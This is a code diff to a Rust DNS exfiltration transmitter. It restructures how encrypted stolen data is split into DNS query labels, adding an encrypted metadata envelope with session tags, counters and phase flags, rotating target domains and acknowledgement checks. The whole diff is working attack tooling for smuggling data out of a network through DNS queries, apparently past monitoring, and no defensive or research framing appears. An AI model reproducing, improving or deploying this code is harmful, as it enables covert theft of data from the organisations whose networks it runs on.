@@ -14,16 +14,19 @@ use trust_dns_proto::rr::{Name, RData, RecordType};
 use trust_dns_proto::serialize::binary::{BinEncodable, BinEncoder};
 
 const LABEL_CAP: usize = 62;
-const MAX_LABELS: usize = 2;
 const SESSION_TAG_LEN: usize = 3;
 const SESSION_TAG_PREFIX: char = 'E';
-const COUNTER_WIDTH: usize = 5;
-const CHUNK_PREFIX_LEN: usize = 2 + 1 + SESSION_TAG_LEN + 1 + COUNTER_WIDTH + 1; // EX-ID-CHUNK-
-const LABEL_DELIM: char = '-';
-const COMPLETE_SUFFIX: &str = "COMPLETE";
-const FLAG_HEADER: u8 = 0x01;
 const HEADER_CHUNK_INDEX: u32 = u32::MAX;
-const MAX_FRAME_STRING: usize = LABEL_CAP * MAX_LABELS;
+const META_LABEL_PREFIX: &str = "EX";
+const PAD_LABEL: &str = "0";
+const ENVELOPE_VERSION: u8 = 1;
+const ENVELOPE_LEN: usize = SESSION_TAG_LEN + 1 + 1 + 4; // tag + version + flags + counter
+const ENVELOPE_FLAG_INIT: u8 = 0x01;
+const ENVELOPE_FLAG_CHUNK: u8 = 0x02;
+const ENVELOPE_FLAG_COMPLETE: u8 = 0x04;
+const ENVELOPE_FLAG_METADATA: u8 = 0x08;
+const ENVELOPE_FLAG_FINAL: u8 = 0x10;
+const FLAG_HEADER: u8 = 0x01;
 
 pub struct DnsTransmitter {
     cfg: Config,
@@ -82,22 +85,12 @@ impl DnsTransmitter {
         descriptor: FrameDescriptor,
         payload: Option<&[u8]>,
     ) -> Result<()> {
-        let encoded_payload = match payload {
-            Some(bytes) => {
-                if bytes.is_empty() {
-                    return Err(anyhow!("chunk payload must not be empty"));
-                }
-                let ciphertext = encrypt(bytes, &self.aes_key).map_err(|e| anyhow!("{e}"))?;
-                Some(base36::encode(&ciphertext))
-            }
-            None => None,
-        };
-
-        if descriptor.requires_payload() != encoded_payload.is_some() {
+        if descriptor.requires_payload() != payload.is_some() {
             return Err(anyhow!("chunk frames must include payload data"));
         }
 
-        let qname = self.build_name(session, &descriptor, encoded_payload.as_deref())?;
+        let (meta_label, data_label) = self.build_labels(session, &descriptor, payload)?;
+        let qname = self.build_name(&meta_label, &data_label)?;
 
         let mut last_err = None;
         for attempt in 0..3 {
@@ -149,79 +142,86 @@ impl DnsTransmitter {
         Ok(matches!(ack, Some(ip) if ip == self.ack_next))
     }
 
-    fn build_name(
-        &mut self,
-        session: &ExfilSession,
-        descriptor: &FrameDescriptor,
-        payload: Option<&str>,
-    ) -> Result<Name> {
-        let frame = self.format_frame_string(session, descriptor, payload)?;
-        if frame.len() > MAX_FRAME_STRING {
-            return Err(anyhow!("frame exceeds two-label budget"));
-        }
-
-        let mut labels = Vec::new();
-        let mut idx = 0;
-        let bytes = frame.as_bytes();
-        while idx < bytes.len() {
-            let end = (idx + LABEL_CAP).min(bytes.len());
-            let label = std::str::from_utf8(&bytes[idx..end])?.to_string();
-            labels.push(label);
-            idx = end;
-            if labels.len() > MAX_LABELS {
-                return Err(anyhow!("frame requires more than {} labels", MAX_LABELS));
-            }
-        }
-
-        if labels.is_empty() {
-            labels.push("0".to_string());
-        }
-
+    fn build_name(&mut self, meta_label: &str, data_label: &str) -> Result<Name> {
         let domain = self.select_domain();
-        let fqdn = format!("{}.{}", labels.join("."), domain);
+        let fqdn = format!("{}.{}.{}", meta_label, data_label, domain);
         Name::from_ascii(fqdn).context("invalid query name")
     }
 
-    fn format_frame_string(
+    fn build_labels(
         &self,
         session: &ExfilSession,
         descriptor: &FrameDescriptor,
-        payload: Option<&str>,
-    ) -> Result<String> {
-        let id_token = encode_session_tag(session.session_id);
-        let frame = match descriptor.phase {
-            FramePhase::Init { total_frames } => {
-                let counter = encode_counter(total_frames, COUNTER_WIDTH)?;
-                format!("EX{d}{id}{d}{counter}", d = LABEL_DELIM, id = id_token)
-            }
-            FramePhase::Chunk { chunk_index } => {
-                let chunk_token = encode_counter(chunk_index, COUNTER_WIDTH)?;
-                let data = payload.ok_or_else(|| anyhow!("chunk frame missing payload"))?;
-                let available = MAX_FRAME_STRING.saturating_sub(CHUNK_PREFIX_LEN);
-                if data.len() > available {
-                    return Err(anyhow!("chunk payload exceeds DNS label budget"));
+        payload: Option<&[u8]>,
+    ) -> Result<(String, String)> {
+        let meta = self.build_metadata_label(session, descriptor)?;
+        let data = match payload {
+            Some(bytes) => {
+                if bytes.is_empty() {
+                    return Err(anyhow!("chunk payload must not be empty"));
                 }
-                format!(
-                    "EX{d}{id}{d}{chunk}{d}{data}",
-                    d = LABEL_DELIM,
-                    id = id_token,
-                    chunk = chunk_token,
-                    data = data
-                )
+                self.build_payload_label(bytes)?
             }
-            FramePhase::Complete => format!(
-                "EX{d}{id}{d}{suffix}",
-                d = LABEL_DELIM,
-                id = id_token,
-                suffix = COMPLETE_SUFFIX
-            ),
+            None => PAD_LABEL.to_string(),
         };
+        Ok((meta, data))
+    }
 
-        if frame.len() > MAX_FRAME_STRING {
-            return Err(anyhow!("frame exceeds DNS limits"));
+    fn build_metadata_label(
+        &self,
+        session: &ExfilSession,
+        descriptor: &FrameDescriptor,
+    ) -> Result<String> {
+        let mut buf = Vec::with_capacity(ENVELOPE_LEN);
+        buf.push(ENVELOPE_VERSION);
+        buf.push(self.envelope_flags(session, descriptor));
+        let tag = encode_session_tag(session.session_id);
+        if tag.as_bytes().len() != SESSION_TAG_LEN {
+            return Err(anyhow!("invalid session tag length"));
         }
+        buf.extend_from_slice(tag.as_bytes());
+        let counter = descriptor.counter_value();
+        buf.extend_from_slice(&counter.to_le_bytes());
 
-        Ok(frame)
+        let ciphertext = encrypt(&buf, &self.aes_key).map_err(|e| anyhow!("{e}"))?;
+        let encoded = base36::encode(&ciphertext);
+        let total_len = META_LABEL_PREFIX.len() + encoded.len();
+        if total_len > LABEL_CAP {
+            return Err(anyhow!(
+                "metadata label ({total_len} chars) exceeds label budget {LABEL_CAP}"
+            ));
+        }
+        Ok(format!("{}{}", META_LABEL_PREFIX, encoded))
+    }
+
+    fn envelope_flags(&self, session: &ExfilSession, descriptor: &FrameDescriptor) -> u8 {
+        match descriptor.phase {
+            FramePhase::Init { .. } => ENVELOPE_FLAG_INIT,
+            FramePhase::Chunk { chunk_index } => {
+                let mut flags = ENVELOPE_FLAG_CHUNK;
+                if chunk_index == 0 {
+                    flags |= ENVELOPE_FLAG_METADATA;
+                }
+                if chunk_index as usize == session.job.total_chunks {
+                    flags |= ENVELOPE_FLAG_FINAL;
+                }
+                flags
+            }
+            FramePhase::Complete => ENVELOPE_FLAG_COMPLETE,
+        }
+    }
+
+    fn build_payload_label(&self, bytes: &[u8]) -> Result<String> {
+        ensure_payload_within_budget(bytes.len())?;
+        let ciphertext = encrypt(bytes, &self.aes_key).map_err(|e| anyhow!("{e}"))?;
+        let encoded = base36::encode(&ciphertext);
+        if encoded.len() > LABEL_CAP {
+            return Err(anyhow!(
+                "payload label length {} exceeds label budget {LABEL_CAP}",
+                encoded.len()
+            ));
+        }
+        Ok(encoded)
     }
 
     fn select_domain(&mut self) -> String {
@@ -277,6 +277,14 @@ impl FrameDescriptor {
     fn requires_payload(&self) -> bool {
         matches!(self.phase, FramePhase::Chunk { .. })
     }
+
+    fn counter_value(&self) -> u32 {
+        match self.phase {
+            FramePhase::Init { total_frames } => total_frames,
+            FramePhase::Chunk { chunk_index } => chunk_index,
+            FramePhase::Complete => 0,
+        }
+    }
 }
 
 #[derive(Clone, Copy)]
@@ -323,19 +331,6 @@ fn encode_session_tag(session_id: u32) -> String {
     };
     let suffix = encode_base36_fixed(normalized, digits).expect("fixed width encoding");
     format!("{}{}", SESSION_TAG_PREFIX, suffix)
-}
-
-fn encode_counter(value: u32, width: usize) -> Result<String> {
-    let max = max_value_for_width(width);
-    if value > max {
-        return Err(anyhow!(
-            "value {} exceeds maximum {} for width {}",
-            value,
-            max,
-            width
-        ));
-    }
-    encode_base36_fixed(value, width)
 }
 
 fn encode_base36_fixed(value: u32, width: usize) -> Result<String> {
